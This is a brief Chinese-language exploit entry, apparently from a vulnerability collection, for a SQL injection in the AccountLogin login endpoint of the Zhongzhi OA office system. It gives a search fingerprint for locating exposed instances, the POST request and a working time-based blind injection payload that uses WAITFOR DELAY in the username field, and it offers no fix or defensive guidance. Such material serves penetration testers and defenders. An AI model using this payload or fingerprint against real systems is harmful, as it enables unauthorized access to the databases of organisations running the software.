# 众智OA办公系统AccountLoginSQL注入漏洞

众智OA办公系统AccountLogin ｜ SQL注入 ｜ —
- **指纹**：`body="/Account/Login?ACT=Index"`
- **请求**：`POST /Account/Login?ACT=Index&CLR=Home HTTP/1.1`

**Payload**
```
username=1');WAITFOR+DELAY+'0:0:5'--&password=1&RememberMe=false
```
- **响应特征**：200